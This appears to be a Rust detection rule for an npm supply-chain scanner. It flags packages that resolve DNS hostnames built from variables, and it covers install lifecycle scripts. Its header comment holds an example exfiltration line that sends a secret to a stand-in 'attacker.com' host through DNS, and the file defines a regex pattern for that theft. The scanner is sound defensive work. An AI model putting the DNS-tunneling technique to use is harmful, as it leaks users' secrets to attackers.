//! NPM025 — DNS-based exfiltration shape.
//!
//! When a published package calls `dns.lookup(...)` or
//! `dns.resolve(...)` with a hostname that is *constructed* from
//! variables (concat, template, `Buffer.from(...).toString`), the
//! shape is almost always either (a) DNS tunneling exfil
//! (`dns.lookup(secret + '.attacker.com')`) or (b) DGA-style C2
//! resolution. Static lookups of literal hostnames don't match.
//!
//! High + defer to Stage 2: a small number of legitimate libraries
//! (DNS resolvers, network tools) do this; the LLM is positioned
//! to decide.

use monomi_core::{
    AnalysisCtx, Category, EcosystemId, EntryKind, Finding, Location, Rule, Severity,
};
use once_cell::sync::Lazy;
use regex::Regex;

pub struct DnsExfil;

static DNS_DYNAMIC_RE: Lazy<Regex> = Lazy::new(|| {
    // dns.lookup / dns.resolve / dnsPromises.lookup / .resolve4 / .resolve6 /
    // .resolveAny  with a first argument that is NOT a single quoted literal.
    // The non-literal openers we accept are the same set as NPM013.
    Regex::new(
        r#"(?x)
            \bdns(?:Promises)?\s*\.\s*
            (?:lookup|resolve|resolve4|resolve6|resolveAny|resolveTxt|resolveCname)
            \s*\(\s*
            (?:
                Buffer\s*\.\s*from
              | atob\s*\(
              | String\s*\.\s*fromCharCode
              | process\s*\.\s*env\s*\.
              | `[^`]*\$\{
              | \w+\s*\+
            )
        "#,
    )
    .expect("DNS_DYNAMIC_RE")
});

impl Rule for DnsExfil {
    fn id(&self) -> &'static str {
        "NPM025"
    }

    fn applies_to(&self, eco: EcosystemId) -> bool {
        matches!(eco, EcosystemId::Npm)
    }

    fn evaluate(&self, ctx: &AnalysisCtx<'_>) -> Vec<Finding> {
        let mut out = Vec::new();
        for entry in ctx.entries {
            if !matches!(entry.kind, EntryKind::JsSource | EntryKind::Text) {
                continue;
            }
            let Some(text) = entry.text() else { continue };
            if let Some(m) = DNS_DYNAMIC_RE.find(text) {
                out.push(make_finding(entry.path.clone(), m.as_str().to_string()));
            }
        }
        for life in ctx.lifecycle {
            if let Some(m) = DNS_DYNAMIC_RE.find(&life.body) {
                out.push(make_finding(
                    format!("package.json#scripts.{}", life.name),
                    m.as_str().to_string(),
                ));
            }
        }
        out
    }
}

fn make_finding(path: String, hit: String) -> Finding {
    Finding {
        rule_id: "NPM025".into(),
        severity: Severity::High,
        category: Category::Exfil,
        locations: vec![Location {
            path,
            line_start: None,
            line_end: None,
        }],
        excerpt: Some(hit),
        message: "dns.lookup/resolve with a constructed hostname — DNS-tunneling exfil \
             or DGA-style C2 shape"
            .into(),
        defers_to_stage2: true,
    }
}
